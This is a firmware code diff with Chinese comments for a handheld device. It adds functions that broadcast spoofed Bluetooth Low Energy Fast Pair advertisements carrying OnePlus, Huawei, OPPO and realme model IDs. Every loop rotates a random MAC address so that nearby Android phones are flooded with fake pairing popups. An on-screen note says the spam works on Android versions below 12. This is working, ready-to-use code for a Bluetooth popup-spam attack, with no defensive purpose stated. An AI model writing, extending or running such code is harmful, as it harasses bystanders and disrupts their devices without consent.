+    sdata[1] = 0x16;   // Service Data - 16-bit UUID
+    sdata[2] = 0x2C;   // UUID LSB
+    sdata[3] = 0xFE;   // UUID MSB
+    sdata[4] = mid[0]; // Model ID byte 2
+    sdata[5] = mid[1]; // Model ID byte 1
+    sdata[6] = mid[2]; // Model ID byte 0
+    adv.addData(sdata, 7);
+
+    // 3) Tx Power (optional)
+    int8_t txp = (int8_t)((random(0, 121)) - 100); // -100..+20
+    uint8_t txpSeg[4];
+    txpSeg[0] = 2;       // length of (type + 1-byte power)
+    txpSeg[1] = 0x0A;    // Tx Power Level
+    txpSeg[2] = (uint8_t)txp;
+    adv.addData(txpSeg, 3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+static void blePopupShowFastPairInfo() {
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  const char* l1 = "由于谷歌的协议更新";
+  const char* l2 = "仅对部分旧版安卓有效";
+  const char* l3 = "可用于安卓版本<12";
+  const char* l4 = "且支持快速配对的设备";
+  int w1 = u8g2_for_adafruit_gfx.getUTF8Width(l1); int x1 = (display.width()-w1)/2; if (x1<0) x1=0;
+  int w2 = u8g2_for_adafruit_gfx.getUTF8Width(l2); int x2 = (display.width()-w2)/2; if (x2<0) x2=0;
+  int w3 = u8g2_for_adafruit_gfx.getUTF8Width(l3); int x3 = (display.width()-w3)/2; if (x3<0) x3=0;
+  int w4 = u8g2_for_adafruit_gfx.getUTF8Width(l4); int x4 = (display.width()-w4)/2; if (x4<0) x4=0;
+  u8g2_for_adafruit_gfx.setCursor(x1, 20); u8g2_for_adafruit_gfx.print(l1);
+  u8g2_for_adafruit_gfx.setCursor(x2, 32); u8g2_for_adafruit_gfx.print(l2);
+  u8g2_for_adafruit_gfx.setCursor(x3, 44); u8g2_for_adafruit_gfx.print(l3);
+  u8g2_for_adafruit_gfx.setCursor(x4, 56); u8g2_for_adafruit_gfx.print(l4);
+  display.display();
+  while (true) { if (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW) { delay(200); break; } delay(10);} 
+}
+
+void blePopupStart_OnePlusFastPair() {
+  const char* title = "[一加 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0x8A,0x7A,0x95}, // OnePlus Watch 2
+    {0x1E,0xC1,0x11}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_HuaweiFastPair() {
+  const char* title = "[华为 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0x20,0x22,0x08}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_OppoFastPair() {
+  const char* title = "[OPPO 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0xCA,0x4D,0xE1},
+    {0x92,0x16,0x3A}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_RealmeFastPair() {
+  const char* title = "[realme 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const uint8_t models[][3] = {
+    {0xD5,0xC6,0xCE},
+    {0x8C,0xD1,0x0F},
+    {0x8C,0x6B,0x6A}
+  };
+  const size_t count = sizeof(models)/sizeof(models[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv; adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    uint8_t suuid[4] = {3, 0x03, 0x2C, 0xFE}; adv.addData(suuid, sizeof(suuid));
+    const uint8_t* mid = models[(size_t)random(0,(int)count)];
+    uint8_t sdata[8] = {6, 0x16, 0x2C, 0xFE, mid[0], mid[1], mid[2]}; adv.addData(sdata, 7);
+    int8_t txp = (int8_t)((random(0,121)) - 100); uint8_t txBuf[3]={2,0x0A,(uint8_t)txp}; adv.addData(txBuf,3);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = (unsigned long)getBlePopupDelay();
+    while (millis() - start < currentDelay) {
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(10); 
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// 海内存知己，天涯若比邻
+// myblog.top
